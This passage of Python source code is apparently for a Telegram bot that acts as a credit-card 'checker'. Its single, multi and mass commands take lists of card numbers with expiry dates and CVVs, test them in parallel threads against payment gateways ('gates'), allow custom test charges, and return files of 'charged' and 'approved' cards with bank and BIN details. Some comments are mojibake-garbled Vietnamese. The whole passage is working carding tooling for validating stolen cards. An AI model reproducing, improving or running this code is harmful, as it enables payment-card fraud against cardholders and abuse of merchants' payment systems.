        duration = time.time() - start_time

        active_gate = get_active_gate()
        gate_name = get_formatted_gate_name(active_gate)
        # N·∫øu l√† l·ªánh charge t√πy ch·ªânh, ghi ƒë√® t√™n c·ªïng
        if custom_charge_amount is not None:
            amount_in_usd = custom_charge_amount / 100.0
            gate_name = f"Custom Charge {amount_in_usd:.2f}$ (Gate {active_gate})"

        if status == 'gate_dead':
            final_message = (f"**üí† CARD CHECK RESULT üí†**\n\n"
                             f"**üí≥ Card:** `{original_line}`\n"
                             f"**üö¶ Status: ‚ùå GATE DIED**\n"
                             f"**üí¨ Response:** `The payment gateway is currently down (Forbidden). Please contact the admin.`\n\n"
                             f"**üè¶ Gateway:** `{gate_name}`\n"
                             f"**‚è±Ô∏è Took:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker by: {ADMIN_USERNAME}*")
            await msg.edit_text(final_message)
            return

        is_vn_decline = status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE'
        is_invalid_bin_decline = status == 'decline' and full_response == 'INVALID_BIN_DECLINE'
        is_expired_card_decline = status == 'decline' and full_response == 'EXPIRED_CARD_DECLINE'
        is_invalid_cardnumber_decline = status == 'decline' and full_response == 'INVALID_CARDNUMBER_DECLINE'

        if is_invalid_bin_decline:
            final_message = (f"**üí† CARD CHECK RESULT üí†**\n\n"
                             f"**üí≥ Card:** `{original_line}`\n"
                             f"**üö¶ Status: ‚ùå DECLINED**\n"
                             f"**üí¨ Response:** `Invalid Card Number (BIN not found)`\n\n"
                             f"**üè¶ Gateway:** `BIN Check`\n\n"
                             f"**‚è±Ô∏è Took:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker by: {ADMIN_USERNAME}*")
        elif is_invalid_cardnumber_decline:
            final_message = (f"**üí† CARD CHECK RESULT üí†**\n\n"
                             f"**üí≥ Card:** `{original_line}`\n"
                             f"**üö¶ Status: ‚ùå DECLINED**\n"
                             f"**üí¨ Response:** `Invalid Card Number`\n\n"
                             f"**üè¶ Gateway:** `Datatrans Tokenize`\n\n"
                             f"**‚è±Ô∏è Took:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker by: {ADMIN_USERNAME}*")
        elif is_expired_card_decline:
            final_message = (f"**üí† CARD CHECK RESULT üí†**\n\n"
                             f"**üí≥ Card:** `{original_line}`\n"
                             f"**üö¶ Status: ‚ùå DECLINED**\n"
                             f"**üí¨ Response:** `Card Expired`\n\n"
                             f"**üè¶ Gateway:** `Pre-Check`\n\n"
                             f"**‚è±Ô∏è Took:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker by: {ADMIN_USERNAME}*")
        elif is_vn_decline:
            final_message = (f"**üí† CARD CHECK RESULT üí†**\n\n"
                             f"**üí≥ Card:** `{original_line}`\n"
                             f"**üö¶ Status: ‚ùå DECLINED**\n"
                             f"**üí¨ Response:** `DECLINED (Vietnam BIN)`\n\n"
                             f"**üè¶ Gateway:** `{gate_name}`\n\n"
                             f"**‚è±Ô∏è Took:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker by: {ADMIN_USERNAME}*")
        else:
            status_text = ""
            response_message = ""
            
            # Default status mapping for errors and complex cases
            status_map = {
                'custom': ("üîí 3D SECURE", full_response),
                'invalid_format': ("üìã FORMAT ERROR", full_response),
                'error': ("‚ùóÔ∏è ERROR", full_response),
                'unknown': ("‚ùî UNKNOWN", full_response),
            }

            # Determine status text and simple response message
            if status == 'live_success':
                status_text = "‚úÖ Approved"
                response_message = "Card Added Successfully üí≥"
            elif status == 'decline':
                status_text = "‚ùå DECLINED"
                response_message = "Card Declined"
            elif status == 'success':
                try:
                    amount_charged_raw = int(full_response.split('_')[1])
                    amount_in_usd = amount_charged_raw / 100.0
                    status_text = f"‚úÖ CHARGED {amount_in_usd:.2f}$"
                    response_message = f"Transaction successful for {amount_in_usd:.2f}$."
                except (ValueError, IndexError):
                    status_text = "‚úÖ CHARGED"
                    response_message = "Transaction successful!"
            else:
                status_text, response_message = status_map.get(status, status_map['unknown'])

            brand = (bin_info.get('brand') or 'N/A').upper()
            card_type = (bin_info.get('type') or 'N/A').upper()
            level = (bin_info.get('level') or 'N/A').upper()
            bank = bin_info.get('bank') or 'None'
            country_name = (bin_info.get('country_name') or 'N/A').upper()
            country_code = bin_info.get('country_code')
            flag = get_flag_emoji(country_code)
            
            bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
            bin_info_line = " ‚Äì ".join(bin_info_parts)

            bin_details_str = (
                f"üÜî **BIN:** {bin_info_line}\n"
                f"üèõÔ∏è **Bank:** {bank}\n"
                f"üåê **Country:** {country_name} {flag}"
            )
            
            response_display_part = ""
            # Only show full JSON/error for specific cases
            if status in ['custom', 'invalid_format', 'error', 'unknown']:
                safe_response = str(response_message)[:1000]
                response_display_part = f"**üí¨ Response:**\n```json\n{safe_response}\n```"
            else:
                # For success, live_success, decline, show the simple message
                response_display_part = f"**üí¨ Response:** `{response_message}`"

            final_message = (f"**üí† CARD CHECK RESULT üí†**\n\n"
                             f"**üí≥ Card:** `{original_line}`\n"
                             f"**üö¶ Status: {status_text}**\n"
                             f"{response_display_part}\n\n"
                             f"‚ÑπÔ∏è **BIN Info:**\n{bin_details_str}\n\n"
                             f"**üè¶ Gateway:** `{gate_name}`\n\n"
                             f"**‚è±Ô∏è Took:** `{duration:.2f}s`\n\n"
                             f"üë§ *Checker by: {ADMIN_USERNAME}*")
        
        await msg.edit_text(final_message)
        
    except Exception as e:
        logger.error(f"L·ªói trong h√†m _process_single_check: {e}", exc_info=True)
        safe_error_message = str(e).replace('`', "'")
        await msg.edit_text(f"‚õîÔ∏è **System Error:**\n```\n{safe_error_message}\n```")

async def cs_command(update, context):
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B·∫°n kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh n√†y. Vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}")
        return
    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return

    if not context.args: await update.message.reply_text("S·ª≠ d·ª•ng: `/cs cc|mm|yy|cvv` ho·∫∑c `/cs cc|mm/yy|cvv`"); return
    
    line = " ".join(context.args)
    await _process_single_check(update, context, line)

async def cs_custom_amount_command(update, context):
    """Handler cho l·ªánh /cs<amount> c·ªßa admin."""
    user = update.effective_user
    
    if user.id != ADMIN_ID:
        # L·∫∑ng l·∫Ω b·ªè qua n·∫øu kh√¥ng ph·∫£i admin ƒë·ªÉ kh√¥ng g√¢y nhi·ªÖu
        return
        
    if not is_bot_on():
        await update.message.reply_text(MESSAGES_VI["bot_off"]) # Admin lu√¥n th·∫•y ti·∫øng Vi·ªát
        return

    # L·∫•y amount t·ª´ regex
    match = re.match(r'/cs(\d+)', update.message.text, re.IGNORECASE)
    if not match: return # Kh√¥ng kh·ªõp, kh√¥ng ph·∫£i l·ªói
        
    try:
        custom_charge_amount = int(match.group(1))
    except (ValueError, IndexError):
        await update.message.reply_text("‚ùå S·ªë ti·ªÅn charge kh√¥ng h·ª£p l·ªá.")
        return

    # L·∫•y ph·∫ßn card t·ª´ message
    card_info_str = update.message.text[len(match.group(0)):].strip()
    if not card_info_str:
        await update.message.reply_text(f"S·ª≠ d·ª•ng: `/cs{custom_charge_amount} cc|mm|yy|cvv`")
        return
        
    await _process_single_check(update, context, card_info_str, custom_charge_amount=custom_charge_amount)


async def multi_check_command(update, context):
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B·∫°n kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh n√†y. Vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}")
        return
        
    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return
        
    if user.id in ACTIVE_CHECKS:
        await update.message.reply_text("B·∫°n ƒëang c√≥ m·ªôt t√°c v·ª• check kh√°c ƒëang ch·∫°y. Vui l√≤ng ch·ªù n√≥ ho√†n th√†nh ho·∫∑c d√πng /stop.", quote=True)
        return

    text_content = update.message.text.split('/multi', 1)[-1].strip()
    if not text_content:
        await update.message.reply_text("S·ª≠ d·ª•ng: `/multi` v√† d√°n danh s√°ch th·∫ª c·ªßa b·∫°n ·ªü d√≤ng d∆∞·ªõi."); return

    lines = [line.strip() for line in text_content.splitlines() if line.strip()]
    total_lines = len(lines)

    if total_lines == 0:
        await update.message.reply_text("Kh√¥ng c√≥ th·∫ª n√†o ƒë·ªÉ check."); return

    if user.id != ADMIN_ID:
        user_limit = get_user_multi_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"‚õîÔ∏è **V∆∞·ª£t qu√° gi·ªõi h·∫°n!**\n\n"
                f"B·∫°n ƒë√£ g·ª≠i `{total_lines}` th·∫ª, nh∆∞ng gi·ªõi h·∫°n cho l·ªánh /multi l√† `{user_limit}` th·∫ª m·ªói l·∫ßn.\n\n"
                f"ƒê·ªÉ tƒÉng h·∫°n m·ª©c, vui l√≤ng li√™n h·ªá admin {ADMIN_USERNAME}."
            )
            return

    active_gate = get_active_gate()
    gate_name = get_formatted_gate_name(active_gate)
    
    keyboard = [[InlineKeyboardButton("üõë D·ª´ng Task C·ªßa T√¥i", callback_data=f"stop_mytask_{user.id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    status_message = await update.message.reply_text(f"‚è≥ ƒêang kh·ªüi t·∫°o... Chu·∫©n b·ªã check `{total_lines}` th·∫ª qua **{gate_name}**.", reply_markup=reply_markup)
    start_time = time.time()
    
    cancel_event = threading.Event()
    try:
        ACTIVE_CHECKS[user.id] = {
            "full_name": user.full_name,
            "username": user.username,
            "start_time": time.time(),
            "task_type": "multi"
        }
        CANCELLATION_EVENTS[user.id] = cancel_event

        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0}
        results = {k: [] for k in counts.keys()}
        processed_count = 0
        last_update_time = time.time()
        num_threads = min(10, total_lines) 
        gate_died_flag = False
        gate_fail_card = ""

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card, line, cancel_event): line for line in lines}
            for future in as_completed(future_to_line):
                if cancel_event.is_set():
                    break

                processed_count += 1
                try:
                    status, original_line, full_response, bin_info = future.result()
                    
                    if status == 'gate_dead':
                        counts['gate_dead'] += 1
                        gate_fail_card = original_line
                        gate_died_flag = True
                        cancel_event.set()
                        continue

                    counts[status] = counts.get(status, 0) + 1
                    status_icons = {'success': '‚úÖ', 'live_success': '‚úÖ', 'decline': '‚ùå', 'custom': 'üîí', 'invalid_format': 'üìã', 'error': '‚ùóÔ∏è', 'unknown': '‚ùî', 'cancelled': 'üõë'}
                    
                    result_line = ""
                    if status == 'decline':
                        if full_response == 'VIETNAM_BIN_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (VN BIN)`"
                        elif full_response == 'INVALID_BIN_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Invalid BIN)`"
                        elif full_response == 'EXPIRED_CARD_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Expired)`"
                        elif full_response == 'INVALID_CARDNUMBER_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Invalid Card Number)`"
                        else: result_line = f"{status_icons['decline']} `{original_line}`"
                    elif status == 'live_success':
                        bin_str = f"{(bin_info.get('bank') or 'N/A')} - {(bin_info.get('type') or 'N/A')} - {(bin_info.get('brand') or 'N/A')} - {(bin_info.get('country_name') or 'N/A')}"
                        result_line = f"{status_icons['live_success']} `{original_line}` | Approved | `{bin_str}`"
                    elif status == 'invalid_format': result_line = f"{status_icons[status]} `{original_line}` | L√Ω do: {str(full_response)[:50]}" 
                    elif status == 'cancelled': continue
                    else:
                        bin_str = f"{(bin_info.get('bank') or 'N/A')} - {(bin_info.get('type') or 'N/A')} - {(bin_info.get('brand') or 'N/A')} - {(bin_info.get('country_name') or 'N/A')}"
                        result_line = f"{status_icons.get(status, '‚ùî')} `{original_line}` | `{bin_str}`"

                    if result_line: results[status].append(result_line)

                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"L·ªói khi x·ª≠ l√Ω future cho th·∫ª {original_line}: {e}", exc_info=True)
                    counts['error'] += 1
                    results['error'].append(f"‚ùóÔ∏è `{original_line}` | L·ªói x·ª≠ l√Ω: {e}")

                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    
                    cpu_usage = psutil.cpu_percent()
                    ram_usage = psutil.virtual_memory().percent

                    status_lines = [
                        f"**üöÄ Checking in progress...**\n{progress_bar}\n",
                        f"üíª **CPU:** `{cpu_usage}%` | **RAM:** `{ram_usage}%`",
                        f"**Gate:** `{gate_name}`",
                        f"**Progress:** `{processed_count}/{total_lines}`\n"
                    ]
                    if active_gate not in ['7', '8'] or (active_gate == '8' and get_gate8_mode() == 'charge'):
                        status_lines.append(f"‚úÖ **Charged:** `{counts['success']}`")
                    
                    status_lines.extend([
                        f"‚úÖ **Approved:** `{counts['live_success']}`",
                        f"‚ùå **Declined:** `{counts['decline']}`",
                        f"üîí **3D Secure:** `{counts['custom']}` | ‚ùî **Errors:** `{counts['error']}`"
                    ])
                    status_text = "\n".join(status_lines)

                    try:
                        current_reply_markup = reply_markup if not cancel_event.is_set() else None
                        await status_message.edit_text(text=status_text, reply_markup=current_reply_markup)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e): logger.warning(f"L·ªói khi c·∫≠p nh·∫≠t ti·∫øn tr√¨nh /multi: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh khi c·∫≠p nh·∫≠t ti·∫øn tr√¨nh /multi: {e}")
                    last_update_time = time.time()
                
        duration = time.time() - start_time
        update_user_stats(user.id, user, counts)

        if gate_died_flag:
            await status_message.edit_text(
                f"üõë **CHECK STOPPED - GATE DIED** üõë\n\n"
                f"**Reason:** The gate is down (`Forbidden` error).\n"
                f"The process was stopped immediately.\n\n"
                f"**Gate Used:** `{gate_name}`\n"
                f"**Failing Card:** `{gate_fail_card}`\n\n"
                f"**Processed before stop:** `{processed_count}/{total_lines}`",
                reply_markup=None
            )
            return

        if cancel_event.is_set():
            await status_message.edit_text(f"üõë **T√°c v·ª• ƒë√£ ƒë∆∞·ª£c d·ª´ng theo y√™u c·∫ßu.**\n\nƒê√£ x·ª≠ l√Ω: {processed_count}/{total_lines} th·∫ª.", reply_markup=None)
            return

        final_header = [
            f"**üìä Check Complete!**\n",
            f"**Gate Used:** `{gate_name}`",
            f"**Total Cards:** `{total_lines}`",
            f"**Time Taken:** `{duration:.2f}s`\n",
        ]

        final_counts = []
        if active_gate not in ['7', '8'] or (active_gate == '8' and get_gate8_mode() == 'charge'):
            final_counts.append(f"‚úÖ **Charged:** `{counts['success']}`")
        
        final_counts.extend([
            f"‚úÖ **Approved:** `{counts['live_success']}`",
            f"‚ùå **Declined:** `{counts['decline']}`",
            f"üîí **3D Secure:** `{counts['custom']}`",
            f"üìã **Invalid Format:** `{counts['invalid_format']}`",
            f"‚ùóÔ∏è **Errors:** `{counts['error']}`\n",
            f"-----------------------------------------"
        ])

        final_message = final_header + final_counts
        
        if results['live_success']: final_message.extend(("\n**‚úÖ APPROVED:**", *results['live_success']))
        if results['success'] and (active_gate not in ['7', '8'] or (active_gate == '8' and get_gate8_mode() == 'charge')): final_message.extend(("\n**‚úÖ CHARGED CARDS:**", *results['success']))
        if results['custom']: final_message.extend(("\n**üîí 3D SECURE CARDS:**", *results['custom']))
        if results['decline']: final_message.extend(("\n**‚ùå DECLINED CARDS:**", *results['decline']))
        if results['invalid_format']: final_message.extend(("\n**üìã INVALID FORMAT:**", *results['invalid_format']))
        if results['error']: final_message.extend(("\n**‚ùóÔ∏è ERRORS:**", *results['error']))

        final_text = "\n".join(final_message)
        
        if len(final_text) > 4096:
            await status_message.edit_text("K·∫øt qu·∫£ qu√° d√†i ƒë·ªÉ hi·ªÉn th·ªã. S·∫Ω ƒë∆∞·ª£c g·ª≠i d∆∞·ªõi d·∫°ng file.", reply_markup=None)
            with io.BytesIO(final_text.encode('utf-8')) as file_to_send:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=file_to_send, filename="multi_check_results.txt")
        else:
            await status_message.edit_text(final_text, reply_markup=None)

    except Exception as e:
        logger.error(f"L·ªói trong /multi: {e}", exc_info=True)
        await status_message.edit_text(f"‚õîÔ∏è **L·ªói nghi√™m tr·ªçng!**\n```\n{str(e).replace('`', '')}\n```", reply_markup=None)
    finally:
        ACTIVE_CHECKS.pop(user.id, None)
        CANCELLATION_EVENTS.pop(user.id, None)

async def mass_check_handler(update, context):
    user = update.effective_user
    
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B·∫°n kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh n√†y. Vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}")
        return
        
    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return
    
    if user.id in ACTIVE_CHECKS:
        logger.warning(f"User {user.id} ({user.full_name}) tried to spam /mass.")
        await update.message.reply_text("B·∫°n ƒëang c√≥ m·ªôt t√°c v·ª• check kh√°c ƒëang ch·∫°y. Vui l√≤ng ch·ªù n√≥ ho√†n th√†nh ho·∫∑c d√πng /stop.", quote=True)
        return 

    if not update.message.document: await update.message.reply_text("Please attach a .txt file."); return
    document = update.message.document
    if not document.file_name.lower().endswith('.txt'): await update.message.reply_text("Only .txt files are accepted."); return
    
    file = await context.bot.get_file(document.file_id)
    file_content = (await file.download_as_bytearray()).decode('utf-8')
    lines = [line for line in file_content.splitlines() if line.strip()]
    total_lines = len(lines)

    if not lines: await update.message.reply_text("üìÇ The file is empty."); return
    
    if user.id != ADMIN_ID:
        user_limit = get_user_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"‚õîÔ∏è **V∆∞·ª£t qu√° gi·ªõi h·∫°n!**\n\n"
                f"T·ªáp c·ªßa b·∫°n c√≥ `{total_lines}` d√≤ng, nh∆∞ng gi·ªõi h·∫°n c·ªßa b·∫°n l√† `{user_limit}` d√≤ng.\n\n"
                f"Vui l√≤ng li√™n h·ªá admin {ADMIN_USERNAME} ƒë·ªÉ tƒÉng h·∫°n m·ª©c."
            )
            return

    caption = update.message.caption or "/mass"
    
    requested_threads_match = re.match(r'/mass(\d+)', caption)
    requested_threads = int(requested_threads_match.group(1)) if requested_threads_match and requested_threads_match.group(1) else 10

    if user.id != ADMIN_ID:
        num_threads = min(requested_threads, MEMBER_THREAD_LIMIT)
        if requested_threads > MEMBER_THREAD_LIMIT:
            await update.message.reply_text(
                f"‚ö†Ô∏è **Gi·ªõi h·∫°n lu·ªìng!** Th√†nh vi√™n ch·ªâ ƒë∆∞·ª£c d√πng t·ªëi ƒëa {MEMBER_THREAD_LIMIT} lu·ªìng. ƒê√£ t·ª± ƒë·ªông ƒëi·ªÅu ch·ªânh.",
                quote=True
            )
    else:
        # Admin kh√¥ng c√≥ gi·ªõi h·∫°n lu·ªìng
        num_threads = requested_threads

    num_threads = max(1, num_threads)

    active_gate = get_active_gate()
    gate_name = get_formatted_gate_name(active_gate)

    session_timestamp = datetime.now(VIETNAM_TZ).strftime("%Y%m%d-%H%M%S")
    session_dir = os.path.join(LOG_DIR, str(user.id), session_timestamp)
    os.makedirs(session_dir, exist_ok=True)
    
    keyboard = [[InlineKeyboardButton("üõë D·ª´ng Task C·ªßa T√¥i", callback_data=f"stop_mytask_{user.id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    status_message = await update.message.reply_text(f"‚è≥ Kh·ªüi t·∫°o... Chu·∫©n b·ªã check `{total_lines}` th·∫ª v·ªõi `{num_threads}` lu·ªìng qua **{gate_name}**.", reply_markup=reply_markup)
    start_time = time.time()
    
    cancel_event = threading.Event()
    try:
        ACTIVE_CHECKS[user.id] = {
            "full_name": user.full_name,
            "username": user.username,
            "start_time": time.time(),
            "task_type": "mass"
        }
        CANCELLATION_EVENTS[user.id] = cancel_event

        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0}
        result_lists = {k: [] for k in counts.keys()}
        result_lists['error_debug'] = []
        processed_count = 0
        last_update_time = time.time()
        gate_died_flag = False
        gate_fail_card = ""

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card, line, cancel_event): line for line in lines}
            for future in as_completed(future_to_line):
                if cancel_event.is_set():
                    break

                processed_count += 1
                try:
                    status, original_line, full_response, bin_info = future.result()
                    
                    if status == 'gate_dead':
                        counts['gate_dead'] += 1
                        gate_fail_card = original_line
                        gate_died_flag = True
                        cancel_event.set()
                        result_lists['error'].append(f"{original_line} | GATE DIED (Forbidden)")
                        continue
                    
                    counts[status] = counts.get(status, 0) + 1
                    
                    line_to_save = ""
                    if status == 'decline':
                        if full_response == 'VIETNAM_BIN_DECLINE': line_to_save = f"{original_line} | DECLINED (VN BIN)"
                        elif full_response == 'INVALID_BIN_DECLINE': line_to_save = f"{original_line} | DECLINED (Invalid BIN)"
                        elif full_response == 'EXPIRED_CARD_DECLINE': line_to_save = f"{original_line} | DECLINED (Expired)"
                        elif full_response == 'INVALID_CARDNUMBER_DECLINE': line_to_save = f"{original_line} | DECLINED (Invalid Card Number)"
                        else: line_to_save = f"{original_line} | DECLINED"
                    elif status == 'live_success':
                        bin_str = f"| {(bin_info.get('bank') or 'N/A')} - {(bin_info.get('type') or 'N/A')} - {(bin_info.get('brand') or 'N/A')} - {(bin_info.get('country_name') or 'N/A')}"
                        line_to_save = f"{original_line} | APPROVED‚úÖ {bin_str}"
                    elif status == 'invalid_format': line_to_save = f"{original_line} | Reason: {full_response}"
                    elif status == 'cancelled': continue
                    else:
                        bin_str = f"| {(bin_info.get('bank') or 'N/A')} - {(bin_info.get('type') or 'N/A')} - {(bin_info.get('brand') or 'N/A')} - {(bin_info.get('country_name') or 'N/A')}"
                        line_to_save = f"{original_line} {bin_str}"
                    
                    if line_to_save: result_lists[status].append(line_to_save)

                    if status in ['error', 'unknown']:
                        debug_info = f"Card: {original_line}\nResponse: {str(full_response)[:3500]}"
                        result_lists['error_debug'].append(debug_info)
                        if user.id != ADMIN_ID:
                            await context.bot.send_message(chat_id=ADMIN_ID, text=f"üêû DEBUG ALERT (user {user.id}):\n{debug_info}")
                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"L·ªói khi x·ª≠ l√Ω future cho th·∫ª {original_line} trong /mass: {e}", exc_info=True)
                    counts['error'] += 1
                    result_lists['error'].append(f"{original_line} | L·ªói x·ª≠ l√Ω: {e}")

                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    
                    cpu_usage = psutil.cpu_percent()
                    ram_usage = psutil.virtual_memory().percent
                    
                    status_lines = [
                        f"**üöÄ Checking in progress...**\n{progress_bar}\n",
                        f"üíª **CPU:** `{cpu_usage}%` | **RAM:** `{ram_usage}%`",
                        f"**Gate:** `{gate_name}` | **Threads:** `{num_threads}`",
                        f"**Progress:** `{processed_count}/{total_lines}`\n"
                    ]
                    if active_gate not in ['7', '8'] or (active_gate == '8' and get_gate8_mode() == 'charge'):
                        status_lines.append(f"‚úÖ **Charged:** `{counts['success']}`")
                    
                    status_lines.extend([
                        f"‚úÖ **Approved:** `{counts['live_success']}`",
                        f"‚ùå **Declined:** `{counts['decline']}`",
                        f"üîí **3D Secure:** `{counts['custom']}`",
                        f"üìã **Invalid Format:** `{counts['invalid_format']}`",
                        f"‚ùî **Errors:** `{counts['error']}`"
                    ])
                    status_text = "\n".join(status_lines)

                    try: 
                        current_reply_markup = reply_markup if not cancel_event.is_set() else None
                        await status_message.edit_text(text=status_text, reply_markup=current_reply_markup)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e): logger.warning(f"L·ªói khi c·∫≠p nh·∫≠t ti·∫øn tr√¨nh /mass: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh khi c·∫≠p nh·∫≠t ti·∫øn tr√¨nh /mass: {e}")
                    last_update_time = time.time()
                
        duration = time.time() - start_time
        
        counts['cancelled'] = total_lines - processed_count

        if gate_died_flag:
            final_summary_text = (
                f"üõë **CHECK STOPPED - GATE DIED** üõë\n\n"
                f"**Reason:** The gate is down (`Forbidden` error).\n"
                f"The process was stopped immediately.\n\n"
                f"**Gate Used:** `{gate_name}`\n"
                f"**Failing Card:** `{gate_fail_card}`\n"
                f"**Processed before stop:** `{processed_count}/{total_lines}`\n\n"
                f"C√°c k·∫øt qu·∫£ ƒë√£ x·ª≠ l√Ω s·∫Ω ƒë∆∞·ª£c g·ª≠i ƒëi."
            )
        elif cancel_event.is_set():
            final_summary_text = (
                f"üõë **T√°c v·ª• ƒë√£ ƒë∆∞·ª£c d·ª´ng theo y√™u c·∫ßu.**\n\n"
                f"ƒê√£ x·ª≠ l√Ω: {processed_count}/{total_lines} th·∫ª. C√°c k·∫øt qu·∫£ ƒë√£ x·ª≠ l√Ω s·∫Ω ƒë∆∞·ª£c g·ª≠i ƒëi."
            )
        else:
            summary_lines = [
                f"**üìä Check Complete!**\n",
                f"**Gate Used:** `{gate_name}`",
                f"**Total:** `{total_lines}` | **Threads:** `{num_threads}`\n"
            ]
            if active_gate not in ['7', '8'] or (active_gate == '8' and get_gate8_mode() == 'charge'):
                summary_lines.append(f"‚úÖ **Charged:** `{counts['success']}`")
            
            summary_lines.extend([
                f"‚úÖ **Approved:** `{counts['live_success']}`",
                f"‚ùå **Declined:** `{counts['decline']}`",
                f"üîí **3D Secure:** `{counts['custom']}`",
                f"üìã **Invalid Format:** `{counts['invalid_format']}`",
                f"‚ùî **Errors:** `{counts['error']}`",
                f"üõë **Cancelled:** `{counts['cancelled']}`\n",
                f"**‚è±Ô∏è Took:** `{duration:.2f}s`"
            ])
            final_summary_text = "\n".join(summary_lines)
        
        await status_message.edit_text(final_summary_text, reply_markup=None)

        summary_data = {'counts': counts, 'original_filename': document.file_name}
        save_json_file(os.path.join(session_dir, "summary.json"), summary_data)
        
        update_user_stats(user.id, user, counts)

        file_map = {
            'success': 'charged.txt', 'live_success': 'approved.txt', 'decline': 'declined.txt',
            'custom': '3d_secure.txt', 'invalid_format': 'invalid_format.txt',
            'error': 'errors.txt', 'unknown': 'unknown.txt'
        }
        for status, filename in file_map.items():
            if result_lists[status]:
                file_path = os.path.join(session_dir, filename)
                with open(file_path, 'w', encoding='utf-8') as f: f.write("\n".join(result_lists[status]))
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=update.effective_chat.id, document=doc)

        if user.id == ADMIN_ID and result_lists['error_debug']:
            debug_path = os.path.join(session_dir, "debug_admin.txt")
            with open(debug_path, 'w', encoding='utf-8') as f: f.write("\n\n---\n\n".join(result_lists['error_debug']))
            with open(debug_path, 'rb') as doc: await context.bot.send_document(chat_id=ADMIN_ID, document=doc)

    except Exception as e:
        logger.error(f"L·ªói trong mass_check: {e}", exc_info=True)
        await status_message.edit_text(f"‚õîÔ∏è **L·ªói nghi√™m tr·ªçng!**\n```\n{str(e).replace('`', '')}\n```", reply_markup=None)
    finally:
        ACTIVE_CHECKS.pop(user.id, None)
        CANCELLATION_EVENTS.pop(user.id, None)

# --- L·ªÜNH D·ª™NG TASK ---
async def stop_command(update, context):
    user = update.effective_user
    target_user_id = user.id

    if user.id == ADMIN_ID and context.args:
        try: target_user_id = int(context.args[0])
        except (ValueError, IndexError):
            await update.message.reply_text("‚ùå User ID kh√¥ng h·ª£p l·ªá. C√∫ ph√°p: `/stop <user_id>`"); return
    elif user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text("B·∫°n kh√¥ng c√≥ quy·ªÅn d√πng l·ªánh n√†y."); return

    if target_user_id in CANCELLATION_EVENTS:
        CANCELLATION_EVENTS[target_user_id].set()
        if target_user_id == user.id:
            await update.message.reply_text("‚è≥ ƒê√£ g·ª≠i y√™u c·∫ßu d·ª´ng. T√°c v·ª• s·∫Ω d·ª´ng l·∫°i sau khi ho√†n th√†nh c√°c th·∫ª ƒëang check...")
        else:
            await update.message.reply_text(f"‚è≥ ƒê√£ g·ª≠i y√™u c·∫ßu d·ª´ng t√°c v·ª• c·ªßa ng∆∞·ªùi d√πng `{target_user_id}`.")
    else:
        if target_user_id == user.id:
            await update.message.reply_text("‚ÑπÔ∏è B·∫°n kh√¥ng c√≥ t√°c v·ª• /mass ho·∫∑c /multi n√†o ƒëang ch·∫°y.")
        else:
            await update.message.reply_text(f"‚ÑπÔ∏è Ng∆∞·ªùi d√πng `{target_user_id}` kh√¥ng c√≥ t√°c v·ª• n√†o ƒëang ch·∫°y.")


# --- C√ÅC L·ªÜNH QU·∫¢N L√ù & TH√îNG B√ÅO ---

async def active_checks_command(update, context):
    """(Admin) Shows currently running tasks with stop buttons."""
    if update.effective_user.id != ADMIN_ID: return

    if not ACTIVE_CHECKS:
